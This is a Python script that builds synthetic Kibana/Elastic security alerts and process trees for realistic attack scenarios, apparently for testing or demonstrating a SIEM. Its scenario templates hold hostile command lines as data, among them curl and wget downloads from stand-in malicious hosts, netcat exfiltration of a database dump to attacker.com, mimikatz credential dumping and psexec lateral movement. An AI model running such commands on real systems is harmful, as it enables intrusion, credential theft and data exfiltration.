#!/usr/bin/env python3
"""
Multiple Security Alerts Generator for Elastic Cloud

This script generates multiple varied security alerts for Kibana Security Solution,
creating realistic attack scenarios with different process hierarchies, hostnames,
and malware types.

FEATURES:
=========
1. Configuration File Support: Load custom scenarios from YAML files
2. Campaign Mode: Generate correlated multi-host attacks with shared infrastructure
3. Time Distribution: Spread alerts over minutes/hours/days/weeks with business hours weighting

Each alert includes:
- Process events (2-5 level hierarchy depending on scenario)
- Endpoint alert (malware detection)
- Detection rule alert (high-level alert with kibana.alert.* fields)

CAMPAIGN MODE:
==============
When using --campaign flag, alerts are correlated with:
- Shared attacker IP address
- Common C2 domain and IP
- Related file hashes (same malware family)
- Progressive attack phases (initial access → execution → lateral movement → exfiltration)
- Configurable attack speed (fast/medium/slow)

TIME DISTRIBUTION:
==================
Configure realistic time patterns:
- minutes: Last hour (default)
- hours: Last 24 hours
- days: Last 7 days with weekday weighting
- weeks: Last 30 days
- --working-hours: Weight alerts to business hours (8am-6pm)

CONFIGURATION FILES:
====================
Load scenarios from YAML with --scenarios-file:
- See alert_scenarios.yaml for default scenarios
- See example_custom_scenarios.yaml for custom scenario examples
"""

import argparse
import json
import os
import random
import uuid
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Optional

import requests

# Load environment variables from .env file
try:
    from dotenv import load_dotenv

    load_dotenv()
except ImportError:
    print("⚠️  python-dotenv not available - using environment variables only")
    print("   Install with: pip install python-dotenv")

# Try to import PyYAML, fallback to hardcoded scenarios if not available
try:
    import yaml

    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False
    print("⚠️  PyYAML not available - using hardcoded scenarios only")

# ===========================
# CONFIGURATION - Load from .env file or environment variables
# ===========================
ELASTIC_URL = os.getenv(
    "ELASTIC_URL",
    "localhost:9200",
)
USERNAME = os.getenv("ELASTIC_USERNAME", "elastic")
PASSWORD = os.getenv("ELASTIC_PASSWORD", "changeme")

# Index for alerts (this is the internal Kibana alerts index)
ALERTS_INDEX = os.getenv("ALERTS_INDEX", ".alerts-security.alerts-default")

# The prebuilt "Endpoint Security" rule ID
ELASTIC_SECURITY_RULE_ID = os.getenv(
    "ELASTIC_SECURITY_RULE_ID", "9a1a2dae-0b5f-4c3d-8305-a268d404c306"
)

# Validate required configuration
if not PASSWORD:
    print("⚠️  Warning: ELASTIC_PASSWORD not set in .env file or environment variables")
    print("   The script may fail when attempting to index alerts to Elasticsearch")


# ===========================
# CAMPAIGN CLASS
# ===========================
@dataclass
class Campaign:
    """
    Represents a correlated attack campaign across multiple hosts.

    Attributes:
        id: Unique campaign identifier
        attacker_ip: Common attacker IP address
        c2_domain: Command and control domain
        c2_ip: Command and control IP
        malware_family: Malware family name
        target_hosts: List of target hostnames
        file_hash_base: Base hash for related malware variants
    """

    id: str
    attacker_ip: str
    c2_domain: str
    c2_ip: str
    malware_family: str
    target_hosts: List[str]
    file_hash_base: str


def create_campaign(num_hosts: int) -> Campaign:
    """
    Create a new attack campaign with shared infrastructure.

    Args:
        num_hosts: Number of hosts to target in this campaign

    Returns:
        Campaign object with generated attributes
    """
    campaign_id = generate_uuid()[:8]

    # Generate attacker infrastructure
    attacker_ip = f"203.0.113.{random.randint(1, 254)}"  # TEST-NET-3
    c2_domains = [
        "evil-c2.badactor.com",
        "command.malicious.net",
        "control.darkweb.org",
        "payload.threat.xyz",
        "backdoor.attacker.io",
    ]
    c2_domain = random.choice(c2_domains)
    c2_ip = f"198.51.100.{random.randint(1, 254)}"  # TEST-NET-2

    malware_families = [
        "RedTeam-Ransomware",
        "APT-Backdoor",
        "CryptoMiner-XMR",
        "WebShell-PHP",
        "Trojan-Stealer",
        "Rootkit-Advanced",
    ]
    malware_family = random.choice(malware_families)

    # Generate target hosts
    target_hosts = [generate_random_hostname() for _ in range(num_hosts)]

    # Base hash for malware variants (same family, slight variations)
    file_hash_base = generate_random_hash("md5")[:20]

    return Campaign(
        id=campaign_id,
        attacker_ip=attacker_ip,
        c2_domain=c2_domain,
        c2_ip=c2_ip,
        malware_family=malware_family,
        target_hosts=target_hosts,
        file_hash_base=file_hash_base,
    )


# ===========================
# TIME DISTRIBUTION FUNCTIONS
# ===========================
def calculate_timestamp_offset(
    index: int, total: int, spread_type: str, working_hours: bool = False
) -> int:
    """
    Calculate timestamp offset in minutes based on spread type and position.

    Args:
        index: Current alert index (0 to total-1)
        total: Total number of alerts
        spread_type: 'minutes', 'hours', 'days', or 'weeks'
        working_hours: If True, weight towards business hours (8am-6pm)

    Returns:
        Offset in minutes from now (going backwards in time)
    """
    # Define time ranges for each spread type
    time_ranges = {
        "minutes": 60,  # Last hour
        "hours": 24 * 60,  # Last 24 hours
        "days": 7 * 24 * 60,  # Last 7 days
        "weeks": 30 * 24 * 60,  # Last 30 days
    }

    max_offset = time_ranges.get(spread_type, 60)

    # Calculate base offset (linear distribution)
    base_offset = int((index / max(total - 1, 1)) * max_offset)

    # Add some randomness (±10% of range)
    jitter = random.randint(-int(max_offset * 0.1), int(max_offset * 0.1))
    offset = max(0, base_offset + jitter)

    # Apply business hours weighting if requested
    if working_hours and spread_type in ["hours", "days", "weeks"]:
        offset = apply_business_hours_weighting(offset)

    return offset


def apply_business_hours_weighting(offset_minutes: int) -> int:
    """
    Adjust timestamp offset to favor business hours (8am-6pm) and weekdays.

    Args:
        offset_minutes: Original offset in minutes

    Returns:
        Adjusted offset that's more likely to fall in business hours
    """
    # Calculate the target timestamp
    target_time = datetime.now(timezone.utc) - timedelta(minutes=offset_minutes)

    # Check if it's a weekend (Saturday=5, Sunday=6)
    if target_time.weekday() >= 5:
        # Move to Friday
        days_to_subtract = target_time.weekday() - 4
        target_time -= timedelta(days=days_to_subtract)

    # Check if it's outside business hours (8am-6pm)
    hour = target_time.hour
    if hour < 8:
        # Move to 8am-12pm
        target_time = target_time.replace(hour=random.randint(8, 12))
    elif hour >= 18:
        # Move to 1pm-5pm
        target_time = target_time.replace(hour=random.randint(13, 17))

    # Recalculate offset
    new_offset = int((datetime.now(timezone.utc) - target_time).total_seconds() / 60)
    return max(0, new_offset)


def get_campaign_phase_offset(
    phase: str, attack_speed: str = "medium"
) -> tuple[int, int]:
    """
    Get the time offset range for a campaign phase based on attack speed.

    Args:
        phase: Attack phase ('initial', 'execution', 'lateral', 'exfiltration')
        attack_speed: 'fast', 'medium', or 'slow'

    Returns:
        Tuple of (min_offset, max_offset) in minutes
    """
    # Define phase timings for different speeds
    speed_configs = {
        "fast": {  # Minutes to hours
            "initial": (50, 60),  # 50-60 min ago
            "execution": (30, 50),  # 30-50 min ago
            "lateral": (10, 30),  # 10-30 min ago
            "exfiltration": (0, 10),  # 0-10 min ago
        },
        "medium": {  # Hours to half day
            "initial": (480, 720),  # 8-12 hours ago
            "execution": (240, 480),  # 4-8 hours ago
            "lateral": (60, 240),  # 1-4 hours ago
            "exfiltration": (0, 60),  # 0-1 hour ago
        },
        "slow": {  # Days to weeks
            "initial": (10080, 20160),  # 7-14 days ago
            "execution": (5040, 10080),  # 3.5-7 days ago
            "lateral": (1440, 5040),  # 1-3.5 days ago
            "exfiltration": (0, 1440),  # 0-1 day ago
        },
    }

    return speed_configs.get(attack_speed, speed_configs["medium"]).get(phase, (0, 60))


def select_campaign_scenario(phase: str, scenarios: List[Dict]) -> Dict:
    """
    Select an appropriate scenario for the campaign phase.

    Args:
        phase: Attack phase ('initial', 'execution', 'lateral', 'exfiltration')
        scenarios: List of available scenarios

    Returns:
        Selected scenario dictionary
    """
    # Map phases to preferred scenario types
    phase_scenarios = {
        "initial": ["Web Shell Deployment", "Backdoor Installation"],
        "execution": [
            "Crypto Miner",
            "Ransomware",
            "Privilege Escalation",
            "Backdoor Installation",
        ],
        "lateral": [
            "Lateral Movement",
            "Privilege Escalation",
            "Backdoor Installation",
        ],
        "exfiltration": ["Data Exfiltration", "Ransomware"],
    }

    # Get preferred scenarios for this phase
    preferred_names = phase_scenarios.get(phase, [])
    preferred = [s for s in scenarios if s["name"] in preferred_names]

    # If no preferred scenarios, use any
    if not preferred:
        preferred = scenarios

    return random.choice(preferred)


# ===========================
# CONFIGURATION FILE SUPPORT
# ===========================
def load_scenarios_from_file(filepath: str) -> Optional[List[Dict]]:
    """
    Load attack scenarios from a YAML configuration file.

    Args:
        filepath: Path to YAML file containing scenarios

    Returns:
        List of scenario dictionaries, or None if loading fails
    """
    if not YAML_AVAILABLE:
        print("❌ PyYAML not installed. Install with: pip install pyyaml")
        return None

    if not os.path.exists(filepath):
        print(f"❌ Scenarios file not found: {filepath}")
        return None

    try:
        with open(filepath, "r") as f:
            data = yaml.safe_load(f)

        scenarios = data.get("scenarios", [])

        # Validate scenarios
        for scenario in scenarios:
            required_fields = ["name", "severity", "processes", "malware_file"]
            if not all(field in scenario for field in required_fields):
                print(f"⚠️  Invalid scenario format: {scenario.get('name', 'unknown')}")
                return None

        print(f"✅ Loaded {len(scenarios)} scenarios from {filepath}")
        return scenarios

    except Exception as e:
        print(f"❌ Error loading scenarios file: {e}")
        return None


# ===========================
# ATTACK SCENARIO TEMPLATES
# ===========================
def get_attack_scenarios():
    """
    Return predefined attack scenario templates with logical process hierarchies.

    Each scenario includes:
    - name: Attack type name
    - description: What the attack does
    - severity: Alert severity level
    - processes: List of processes in hierarchy (root to leaf)
    - malware_file: The malicious file information
    """
    return [
        {
            "name": "Web Shell Deployment",
            "description": "Web server compromised with malicious script",
            "severity": "high",
            "processes": [
                {
                    "name": "apache2",
                    "executable": "/usr/sbin/apache2",
                    "args": ["/usr/sbin/apache2", "-k", "start"],
                    "working_dir": "/var/www",
                    "user": "www-data",
                },
                {
                    "name": "php-fpm",
                    "executable": "/usr/sbin/php-fpm",
                    "args": ["/usr/sbin/php-fpm", "--fpm-config", "/etc/php/fpm.conf"],
                    "working_dir": "/var/www/html",
                    "user": "www-data",
                },
                {
                    "name": "sh",
                    "executable": "/bin/sh",
                    "args": ["/bin/sh", "-c", "curl http://malicious.com/shell"],
                    "working_dir": "/tmp",
                    "user": "www-data",
                },
                {
                    "name": "webshell.php",
                    "executable": "/tmp/webshell.php",
                    "args": ["/tmp/webshell.php", "exec", "reverse"],
                    "working_dir": "/tmp",
                    "user": "www-data",
                },
            ],
            "malware_file": {
                "name": "webshell.php",
                "path": "/tmp/webshell.php",
                "extension": ".php",
            },
        },
        {
            "name": "Crypto Miner",
            "description": "Cryptocurrency mining malware installation",
            "severity": "medium",
            "processes": [
                {
                    "name": "systemd",
                    "executable": "/usr/lib/systemd/systemd",
                    "args": ["/usr/lib/systemd/systemd", "--user"],
                    "working_dir": "/",
                    "user": "root",
                },
                {
                    "name": "cron",
                    "executable": "/usr/sbin/cron",
                    "args": ["/usr/sbin/cron", "-f"],
                    "working_dir": "/var/spool/cron",
                    "user": "root",
                },
                {
                    "name": "wget",
                    "executable": "/usr/bin/wget",
                    "args": [
                        "/usr/bin/wget",
                        "http://evil.com/miner",
                        "-O",
                        "/tmp/xmrig",
                    ],
                    "working_dir": "/tmp",
                    "user": "nobody",
                },
                {
                    "name": "xmrig",
                    "executable": "/tmp/xmrig",
                    "args": [
                        "/tmp/xmrig",
                        "--donate-level=1",
                        "-o",
                        "pool.minexmr.com:4444",
                    ],
                    "working_dir": "/tmp",
                    "user": "nobody",
                },
            ],
            "malware_file": {
                "name": "xmrig",
                "path": "/tmp/xmrig",
                "extension": "",
            },
        },
        {
            "name": "Ransomware",
            "description": "File encryption ransomware attack",
            "severity": "critical",
            "processes": [
                {
                    "name": "explorer.exe",
                    "executable": "C:\\Windows\\explorer.exe",
                    "args": ["C:\\Windows\\explorer.exe"],
                    "working_dir": "C:\\Users\\victim",
                    "user": "victim",
                },
                {
                    "name": "powershell.exe",
                    "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "args": [
                        "powershell.exe",
                        "-ExecutionPolicy",
                        "Bypass",
                        "-File",
                        "C:\\Temp\\dropper.ps1",
                    ],
                    "working_dir": "C:\\Temp",
                    "user": "victim",
                },
                {
                    "name": "encrypt.exe",
                    "executable": "C:\\Temp\\encrypt.exe",
                    "args": [
                        "C:\\Temp\\encrypt.exe",
                        "--target",
                        "C:\\Users",
                        "--extension",
                        ".locked",
                    ],
                    "working_dir": "C:\\Temp",
                    "user": "victim",
                },
            ],
            "malware_file": {
                "name": "encrypt.exe",
                "path": "C:\\Temp\\encrypt.exe",
                "extension": ".exe",
            },
        },
        {
            "name": "Privilege Escalation",
            "description": "Local privilege escalation exploit",
            "severity": "high",
            "processes": [
                {
                    "name": "bash",
                    "executable": "/bin/bash",
                    "args": ["/bin/bash"],
                    "working_dir": "/home/user",
                    "user": "user",
                },
                {
                    "name": "sudo",
                    "executable": "/usr/bin/sudo",
                    "args": ["/usr/bin/sudo", "-u", "root", "/tmp/exploit"],
                    "working_dir": "/tmp",
                    "user": "user",
                },
                {
                    "name": "exploit",
                    "executable": "/tmp/exploit",
                    "args": ["/tmp/exploit", "--target", "kernel"],
                    "working_dir": "/tmp",
                    "user": "user",
                },
                {
                    "name": "rootshell",
                    "executable": "/bin/bash",
                    "args": ["/bin/bash", "-i"],
                    "working_dir": "/root",
                    "user": "root",
                },
            ],
            "malware_file": {
                "name": "exploit",
                "path": "/tmp/exploit",
                "extension": "",
            },
        },
        {
            "name": "Backdoor Installation",
            "description": "Persistent backdoor installation",
            "severity": "critical",
            "processes": [
                {
                    "name": "sshd",
                    "executable": "/usr/sbin/sshd",
                    "args": ["/usr/sbin/sshd", "-D"],
                    "working_dir": "/",
                    "user": "root",
                },
                {
                    "name": "bash",
                    "executable": "/bin/bash",
                    "args": ["/bin/bash"],
                    "working_dir": "/root",
                    "user": "root",
                },
                {
                    "name": "curl",
                    "executable": "/usr/bin/curl",
                    "args": [
                        "/usr/bin/curl",
                        "-o",
                        "/usr/local/bin/backdoor",
                        "http://c2.evil.com/backdoor",
                    ],
                    "working_dir": "/tmp",
                    "user": "root",
                },
                {
                    "name": "backdoor",
                    "executable": "/usr/local/bin/backdoor",
                    "args": ["/usr/local/bin/backdoor", "--persist", "--hide"],
                    "working_dir": "/usr/local/bin",
                    "user": "root",
                },
            ],
            "malware_file": {
                "name": "backdoor",
                "path": "/usr/local/bin/backdoor",
                "extension": "",
            },
        },
        {
            "name": "Data Exfiltration",
            "description": "Sensitive data theft and exfiltration",
            "severity": "high",
            "processes": [
                {
                    "name": "postgres",
                    "executable": "/usr/lib/postgresql/13/bin/postgres",
                    "args": ["postgres", "-D", "/var/lib/postgresql/13/main"],
                    "working_dir": "/var/lib/postgresql",
                    "user": "postgres",
                },
                {
                    "name": "psql",
                    "executable": "/usr/bin/psql",
                    "args": ["/usr/bin/psql", "-c", "COPY users TO '/tmp/data.csv'"],
                    "working_dir": "/tmp",
                    "user": "postgres",
                },
                {
                    "name": "tar",
                    "executable": "/usr/bin/tar",
                    "args": [
                        "/usr/bin/tar",
                        "czf",
                        "/tmp/exfil.tar.gz",
                        "/tmp/data.csv",
                    ],
                    "working_dir": "/tmp",
                    "user": "postgres",
                },
                {
                    "name": "nc",
                    "executable": "/usr/bin/nc",
                    "args": [
                        "/usr/bin/nc",
                        "attacker.com",
                        "4444",
                        "<",
                        "/tmp/exfil.tar.gz",
                    ],
                    "working_dir": "/tmp",
                    "user": "postgres",
                },
            ],
            "malware_file": {
                "name": "exfil.tar.gz",
                "path": "/tmp/exfil.tar.gz",
                "extension": ".tar.gz",
            },
        },
        {
            "name": "Lateral Movement",
            "description": "Credential theft and lateral movement",
            "severity": "critical",
            "processes": [
                {
                    "name": "svchost.exe",
                    "executable": "C:\\Windows\\System32\\svchost.exe",
                    "args": ["C:\\Windows\\System32\\svchost.exe", "-k", "netsvcs"],
                    "working_dir": "C:\\Windows\\System32",
                    "user": "SYSTEM",
                },
                {
                    "name": "rundll32.exe",
                    "executable": "C:\\Windows\\System32\\rundll32.exe",
                    "args": ["rundll32.exe", "C:\\Temp\\mimikatz.dll", "DumpCreds"],
                    "working_dir": "C:\\Temp",
                    "user": "SYSTEM",
                },
                {
                    "name": "mimikatz.exe",
                    "executable": "C:\\Temp\\mimikatz.exe",
                    "args": ["C:\\Temp\\mimikatz.exe", "sekurlsa::logonpasswords"],
                    "working_dir": "C:\\Temp",
                    "user": "SYSTEM",
                },
                {
                    "name": "psexec.exe",
                    "executable": "C:\\Temp\\psexec.exe",
                    "args": ["psexec.exe", "\\\\remote-host", "cmd.exe"],
                    "working_dir": "C:\\Temp",
                    "user": "SYSTEM",
                },
            ],
            "malware_file": {
                "name": "mimikatz.exe",
                "path": "C:\\Temp\\mimikatz.exe",
                "extension": ".exe",
            },
        },
    ]


# ===========================
# RANDOMIZATION FUNCTIONS
# ===========================
def generate_uuid():
    """Generate a UUID for identifiers"""
    return str(uuid.uuid4())


def generate_entity_id():
    """Generate a 10-character entity ID"""
    return str(uuid.uuid4())[:10]


def generate_random_hostname():
    """Generate a realistic hostname"""
    prefixes = [
        "web-server",
        "db-prod",
        "app-server",
        "workstation",
        "mail-server",
        "file-server",
        "backup",
        "dev-machine",
        "jenkins",
        "docker-host",
    ]
    suffixes = [str(random.randint(1, 99)).zfill(2) for _ in range(1)]
    return f"{random.choice(prefixes)}-{random.choice(suffixes)}"


def generate_random_ip():
    """Generate a valid private or public IP address"""
    ip_ranges = [
        (
            "10",
            lambda: f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
        ),
        (
            "172",
            lambda: f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
        ),
        ("192", lambda: f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"),
    ]
    return random.choice(ip_ranges)[1]()


def generate_random_mac():
    """Generate a valid MAC address"""
    return ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])


def generate_random_hash(hash_type="md5"):
    """Generate a random hash"""
    if hash_type == "md5":
        return "".join([f"{random.randint(0, 255):02x}" for _ in range(16)])
    elif hash_type == "sha1":
        return "".join([f"{random.randint(0, 255):02x}" for _ in range(20)])
    elif hash_type == "sha256":
        return "".join([f"{random.randint(0, 255):02x}" for _ in range(32)])


def generate_random_username():
    """Generate a realistic username"""
    usernames = [
        "root",
        "admin",
        "user",
        "postgres",
        "www-data",
        "nobody",
        "system",
        "administrator",
        "service",
        "daemon",
        "operator",
        "victim",
        "analyst",
    ]
    return random.choice(usernames)


def get_severity_mapping(severity):
    """Map severity name to risk score"""
    severity_map = {
        "low": 21,
        "medium": 47,
        "high": 73,
        "critical": 99,
    }
    return severity_map.get(severity, 47)


# ===========================
# VARIED ALERT GENERATION
# ===========================
def generate_varied_alert(
    scenario,
    hostname=None,
    agent_id=None,
    timestamp_offset=0,
    campaign: Optional[Campaign] = None,
):
    """
    Generate a detection rule alert based on an attack scenario.

    Args:
        scenario: Attack scenario dictionary from get_attack_scenarios()
        hostname: Optional hostname override
        agent_id: Optional agent ID override
        timestamp_offset: Minutes to offset the timestamp (for spreading alerts over time)
        campaign: Optional Campaign object for correlated attacks

    Returns:
        dict: Detection rule alert with full kibana.alert.* fields
    """
    now = (datetime.now(timezone.utc) - timedelta(minutes=timestamp_offset)).isoformat()

    if agent_id is None:
        agent_id = generate_uuid()

    if hostname is None:
        hostname = generate_random_hostname()

    # Generate entity IDs for the process hierarchy
    num_processes = len(scenario["processes"])
    entity_ids = [generate_entity_id() for _ in range(num_processes)]

    # The last process is the malware (leaf node)
    process_entity_id = entity_ids[-1]
    # The first process is the session leader (root)
    session_leader_id = entity_ids[0]
    # Build ancestry from leaf to root (excluding the process itself)
    ancestry = entity_ids[-2::-1]  # Reverse order, excluding last

    # Get process details for the malicious process
    malware_process = scenario["processes"][-1]

    # Random IPs and MACs
    host_ip = generate_random_ip()
    host_mac = generate_random_mac()

    # Generate hashes - use campaign base if in campaign mode
    if campaign:
        # Use campaign hash base with variation for related malware
        file_md5 = campaign.file_hash_base + generate_random_hash("md5")[:12]
        file_sha1 = campaign.file_hash_base + generate_random_hash("sha1")[:20]
        file_sha256 = campaign.file_hash_base + generate_random_hash("sha256")[:44]
    else:
        # Random hashes for standalone alerts
        file_md5 = generate_random_hash("md5")
        file_sha1 = generate_random_hash("sha1")
        file_sha256 = generate_random_hash("sha256")

    # Get severity
    severity = scenario["severity"]
    risk_score = get_severity_mapping(severity)

    alert = {
        "@timestamp": now,
        # Agent information
        "agent": {"id": agent_id, "type": "endpoint", "version": "8.17.0"},
        # Host information
        "host": {
            "architecture": "x86_64",
            "hostname": hostname,
            "id": generate_uuid(),
            "ip": [host_ip, generate_random_ip()],
            "mac": [host_mac],
            "name": hostname,
            "os": {
                "family": "linux",
                "full": "Ubuntu 20.04",
                "kernel": "5.4.0-42-generic",
                "name": "Linux",
                "platform": "linux",
                "type": "linux",
                "version": "10.0",
            },
        },
        # Data stream
        "data_stream": {
            "dataset": "endpoint.alerts",
            "namespace": "default",
            "type": "logs",
        },
        # ECS version
        "ecs": {"version": "1.4.0"},
        # File information (malware)
        "file": {
            "Ext": {
                "code_signature": [{"subject_name": "bad signer", "trusted": False}],
                "malware_classification": {
                    "identifier": "endpointpe",
                    "score": 1.0,
                    "threshold": 0.66,
                    "version": "3.0.33",
                },
                "quarantine_message": f"{scenario['name']} detected and quarantined",
                "quarantine_result": True,
                "temp_file_path": scenario["malware_file"]["path"],
            },
            "accessed": int(datetime.now(timezone.utc).timestamp() * 1000),
            "created": int(datetime.now(timezone.utc).timestamp() * 1000),
            "hash": {
                "md5": file_md5,
                "sha1": file_sha1,
                "sha256": file_sha256,
            },
            "mtime": int(datetime.now(timezone.utc).timestamp() * 1000),
            "name": scenario["malware_file"]["name"],
            "owner": malware_process["user"],
            "path": scenario["malware_file"]["path"],
            "size": random.randint(1024, 1024000),
        },
        # Process information
        "process": {
            "Ext": {
                "ancestry": ancestry,
                "code_signature": [{"subject_name": "bad signer", "trusted": False}],
                "token": {
                    "domain": "localhost",
                    "integrity_level": 16384,
                    "integrity_level_name": "system",
                    "sid": "S-1-5-18",
                    "type": "tokenPrimary",
                    "user": malware_process["user"],
                },
                "user": malware_process["user"],
            },
            "entity_id": process_entity_id,
            "entry_leader": {
                "entity_id": session_leader_id,
                "name": scenario["processes"][0]["name"],
                "pid": 100 + random.randint(0, 50),
                "start": ["1970-01-01T00:00:00.000Z"],
            },
            "executable": malware_process["executable"],
            "group_leader": {
                "entity_id": session_leader_id,
                "name": scenario["processes"][0]["name"],
                "pid": 100 + random.randint(0, 50),
            },
            "hash": {
                "md5": file_md5,
                "sha1": file_sha1,
                "sha256": file_sha256,
            },
            "name": malware_process["name"],
            "parent": {
                "entity_id": entity_ids[-2] if num_processes > 1 else session_leader_id,
                "pid": 1000 + random.randint(0, 1000),
            },
            "pid": 2000 + random.randint(0, 3000),
            "session_leader": {
                "entity_id": session_leader_id,
                "name": scenario["processes"][0]["name"],
                "pid": 100 + random.randint(0, 50),
            },
            "start": int(datetime.now(timezone.utc).timestamp() * 1000),
            "uptime": 0,
        },
        # Event information
        "event.action": "creation",
        "event.agent_id_status": "verified",
        "event.category": "malware",
        "event.code": "malicious_file",
        "event.dataset": "endpoint",
        "event.id": generate_uuid(),
        "event.ingested": now,
        "event.kind": "signal",
        "event.module": "endpoint",
        "event.sequence": random.randint(1, 100),
        "event.type": "creation",
        # Kibana alert fields
        "kibana.alert.ancestors": [
            {
                "depth": 0,
                "id": generate_uuid()[:20],
                "index": ".ds-logs-endpoint.alerts-default-2024.10.27-000001",
                "type": "event",
            }
        ],
        "kibana.alert.depth": 1,
        "kibana.alert.original_event.action": "creation",
        "kibana.alert.original_event.agent_id_status": "verified",
        "kibana.alert.original_event.category": "malware",
        "kibana.alert.original_event.code": "malicious_file",
        "kibana.alert.original_event.dataset": "endpoint",
        "kibana.alert.original_event.id": generate_uuid(),
        "kibana.alert.original_event.ingested": now,
        "kibana.alert.original_event.kind": "alert",
        "kibana.alert.original_event.module": "endpoint",
        "kibana.alert.original_event.sequence": random.randint(1, 100),
        "kibana.alert.original_event.type": "creation",
        "kibana.alert.original_time": now,
        "kibana.alert.reason": f"malware event with process {malware_process['name']}, file {scenario['malware_file']['name']}, on {hostname} created {severity} alert {scenario['name']}.",
        "kibana.alert.risk_score": risk_score,
        # Detection rule metadata
        "kibana.alert.rule.actions": [],
        "kibana.alert.rule.author": ["Elastic"],
        "kibana.alert.rule.category": "Custom Query Rule",
        "kibana.alert.rule.consumer": "siem",
        "kibana.alert.rule.created_at": "2024-10-26T21:02:00.237Z",
        "kibana.alert.rule.created_by": "elastic",
        "kibana.alert.rule.description": "Generates a detection alert each time an Elastic Endpoint Security alert is received. Enabling this rule allows you to immediately begin investigating your Endpoint alerts.",
        "kibana.alert.rule.enabled": True,
        "kibana.alert.rule.exceptions_list": [
            {
                "id": "endpoint_list",
                "list_id": "endpoint_list",
                "namespace_type": "agnostic",
                "type": "endpoint",
            }
        ],
        "kibana.alert.rule.execution.uuid": generate_uuid(),
        "kibana.alert.rule.false_positives": [],
        "kibana.alert.rule.from": "now-10m",
        "kibana.alert.rule.immutable": True,
        "kibana.alert.rule.indices": ["logs-endpoint.alerts-*"],
        "kibana.alert.rule.interval": "5m",
        "kibana.alert.rule.license": "Elastic License v2",
        "kibana.alert.rule.max_signals": 10000,
        "kibana.alert.rule.name": "Endpoint Security",
        "kibana.alert.rule.parameters": {
            "author": ["Elastic"],
            "description": "Generates a detection alert each time an Elastic Endpoint Security alert is received. Enabling this rule allows you to immediately begin investigating your Endpoint alerts.",
            "enabled": True,
            "exceptions_list": [
                {
                    "id": "endpoint_list",
                    "list_id": "endpoint_list",
                    "namespace_type": "agnostic",
                    "type": "endpoint",
                }
            ],
            "from": "now-10m",
            "index": ["logs-endpoint.alerts-*"],
            "language": "kuery",
            "license": "Elastic License v2",
            "max_signals": 10000,
            "name": "Endpoint Security",
            "query": "event.kind:alert and event.module:(endpoint and not endgame)\n",
            "required_fields": [
                {"ecs": True, "name": "event.kind", "type": "keyword"},
                {"ecs": True, "name": "event.module", "type": "keyword"},
            ],
            "risk_score": risk_score,
            "risk_score_mapping": [
                {"field": "event.risk_score", "operator": "equals", "value": ""}
            ],
            "rule_id": ELASTIC_SECURITY_RULE_ID,
            "rule_name_override": "message",
            "severity": severity,
            "severity_mapping": [
                {
                    "field": "event.severity",
                    "operator": "equals",
                    "severity": "low",
                    "value": "21",
                },
                {
                    "field": "event.severity",
                    "operator": "equals",
                    "severity": "medium",
                    "value": "47",
                },
                {
                    "field": "event.severity",
                    "operator": "equals",
                    "severity": "high",
                    "value": "73",
                },
                {
                    "field": "event.severity",
                    "operator": "equals",
                    "severity": "critical",
                    "value": "99",
                },
            ],
            "tags": ["Elastic", "Endpoint Security"],
            "timestamp_override": "event.ingested",
            "type": "query",
            "version": 100,
        },
        "kibana.alert.rule.producer": "siem",
        "kibana.alert.rule.references": [],
        "kibana.alert.rule.risk_score": risk_score,
        "kibana.alert.rule.risk_score_mapping": [
            {"field": "event.risk_score", "operator": "equals", "value": ""}
        ],
        "kibana.alert.rule.rule_id": ELASTIC_SECURITY_RULE_ID,
        "kibana.alert.rule.rule_name_override": "message",
        "kibana.alert.rule.rule_type_id": "siem.queryRule",
        "kibana.alert.rule.severity": severity,
        "kibana.alert.rule.severity_mapping": [
            {
                "field": "event.severity",
                "operator": "equals",
                "severity": "low",
                "value": "21",
            },
            {
                "field": "event.severity",
                "operator": "equals",
                "severity": "medium",
                "value": "47",
            },
            {
                "field": "event.severity",
                "operator": "equals",
                "severity": "high",
                "value": "73",
            },
            {
                "field": "event.severity",
                "operator": "equals",
                "severity": "critical",
                "value": "99",
            },
        ],
        "kibana.alert.rule.tags": ["Elastic", "Endpoint Security"],
        "kibana.alert.rule.threat": [],
        "kibana.alert.rule.timestamp_override": "event.ingested",
        "kibana.alert.rule.to": "now",
        "kibana.alert.rule.type": "query",
        "kibana.alert.rule.updated_at": "2024-10-26T21:02:00.237Z",
        "kibana.alert.rule.updated_by": "elastic",
        "kibana.alert.rule.uuid": "6eae8572-5571-11ed-a602-953b659b2e32",
        "kibana.alert.rule.version": 100,
        # Alert status and workflow
        "kibana.alert.severity": severity,
        "kibana.alert.status": "active",
        "kibana.alert.uuid": generate_uuid(),
        "kibana.alert.workflow_status": "open",
        # Kibana space and version
        "kibana.space_ids": ["default"],
        "kibana.version": "8.17.0",
    }

    return alert, entity_ids


def generate_varied_process_events(
    scenario, entity_ids, hostname, agent_id, timestamp_offset=0
):
    """
    Generate process events for a variable-depth process hierarchy.

    Args:
        scenario: Attack scenario dictionary
        entity_ids: List of entity IDs for each process (from root to leaf)
        hostname: Hostname for the events
        agent_id: Agent ID for the events
        timestamp_offset: Minutes to offset timestamps

    Returns:
        list: Process event dictionaries for each process in the hierarchy
    """
    now = (datetime.now(timezone.utc) - timedelta(minutes=timestamp_offset)).isoformat()
    base_timestamp_ms = int(
        (datetime.now(timezone.utc) - timedelta(minutes=timestamp_offset)).timestamp()
        * 1000
    )

    events = []
    session_leader_id = entity_ids[0]

    for i, process_info in enumerate(scenario["processes"]):
        entity_id = entity_ids[i]

        # Build ancestry (all previous processes in reverse order)
        if i == 0:
            ancestry = []
            parent_info = None
        else:
            ancestry = entity_ids[i - 1 :: -1]
            parent_info = scenario["processes"][i - 1]

        # Generate hash for this process
        process_hash = generate_random_hash("md5")

        event = {
            "@timestamp": now,
            "agent": {"type": "endpoint", "id": agent_id},
            "ecs": {"version": "1.4.0"},
            "event": {
                "kind": "event",
                "category": ["process"],
                "type": ["start"],
                "action": "exec",
                "id": generate_uuid(),
                "sequence": i + 1,
            },
            "process": {
                "entity_id": entity_id,
                "pid": 100 + (i * 1000) + random.randint(0, 100),
                "name": process_info["name"],
                "executable": process_info["executable"],
                "command_line": " ".join(process_info["args"]),
